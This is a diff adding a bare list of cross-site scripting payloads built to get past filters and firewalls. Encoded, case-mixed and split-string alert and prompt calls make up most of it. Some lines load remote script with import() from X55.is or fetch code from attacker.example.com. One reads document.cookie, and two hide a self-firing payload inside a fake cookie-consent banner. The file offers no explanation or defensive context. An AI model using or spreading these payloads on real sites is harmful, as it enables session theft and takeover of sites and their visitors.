@@ -1,0 +1,48 @@
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+<img src="data:image/svg+xml,<svg onload=alert(1)>">
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>String.fromCharCode(97,108,101,114,116)(1)</script>
+javascript:alert(1)//<svg/onload=alert(1)>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<svg><script>alert(1)</script></svg>
+<img src=x onerror=alert(1)>
+<video><source onerror=alert(1)>
+<a href="javascript:alert(1)">click</a>
+<select><noembed>\u0061lert = alert;//a@b%0aalert(1)</noembed></select>
+<img longdesc="src='x'onerror=alert(document.domain);//><img src='showme'>
+top[8680439..toString(30)](document.domain)
+<svg onload=prompt%26%230000000040document.domain)>
+<sCrIpT>alert(1)</sCrIpT>
+<input autofocus onbeforeinput='(async()=>{this.parentElement[await (await fetch("https://attacker.example.com/a.txt")).text()]=(await (await fetch("https://attacker.example.com/b.txt")).text())})();'>
+<div style="font-size:1.5rem;color:black;background-color:white;border-color:black;border-style:solid;border-width:5px;height:200px;width:400px;overflow-y:scroll;scroll-snap-type:y;" data-x="innerHTML" data-y="PGltZyBzcmM9ImludmFsaWQ6Ly8iIG9uZXJyb3I9ImFsZXJ0KHdpbmRvdy5sb2NhdGlvbikiPg==" onscrollsnapchanging=this[this.dataset.x]=atob(this.dataset.y);><div style="height:100px;scroll-snap-align:center;">Cookie selection.</div><div style="height:100px;scroll-snap-align:center;">Please tell us your choice about cookies below.</div><div id=auto-xss-trigger style="height:100px;scroll-snap-align:center;">Accept Deny</div></div>#auto-xss-trigger
+<div style="font-size:1.5rem;color:black;background-color:white;border-color:black;border-style:solid;border-width:5px;height:200px;width:400px;overflow-y:scroll;scroll-snap-type:y;" data-x="eval" data-y="YWxlcnQod2luZG93LmxvY2F0aW9uKQ==" onscrollsnapchanging=window[this.dataset.x](atob(this.dataset.y));><div style="height:100px;scroll-snap-align:center;">Cookie selection.</div><div style="height:100px;scroll-snap-align:center;">Please tell us your choice about cookie below.</div><div id=auto-xss-trigger2 style="height:100px;scroll-snap-align:center;">Accept Deny</div></div>#auto-xss-trigger2
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+<details/open/id="&quot;"ontoggle=alert(1)>
+<details open id="'&quot;'" ontoggle=alert(1)>
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+<x x="&quot;"onerror=alert(1)>
+<x x="&#x22;"onerror=alert(1)>
+<x x="&#34;"onerror=alert(1)>
+<x x="&#00000000034;"onerror=alert(1)>
+<scr<script>ipt>prompt(1)</script>
+<address onscrollsnapchange=window['ev'+'a'+(['l','b','c'][0])](window['a'+'to'+(['b','c','d'][0])]('YWxlcnQob3JpZ2luKQ==')); style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>
+<Img Src=OnXSS OnError=(alert)(1)>
+javascript:window['al'+'er'+(['t','b','c'][0])](origin)
+meydi" or 1=/*</script>*/ -- - <XSS>
+<Image Src=//X55.is OnLoad%0C=import(Src)//
+<A Href AutoFocus %252F="/\"OnFocus=k='t',top >
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+<svg/onload=window["al"+"ert"]`1337`>
+' oncontentvisibilityautostatechange='a=alert,(a?a:a)(origin)' x=\v+styl\u0065='content-visibility:auto'
+"><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>
+<img%20hrEF="x"%20sRC="data:x,"%20oNLy=1%20oNErrOR=prompt`1`//>
+<img//////src=x oNlY=1 oNerror=alert('xxs')//
+'-alert?.(1)-'
+<Img/Src/OnError=(alert)(1)>
+<div onpointerrawupdate=alert(1)>
+<body onresize=alert(1)>
+javascript:alert(1)//<img src=x onerror=alert(1)>
+<script>/*@cc_on!@*/alert(1)</script>
+<img src="x" onerror=alert(1)//
+<img src=x onerror=%61%6c%65%72%74(1)>
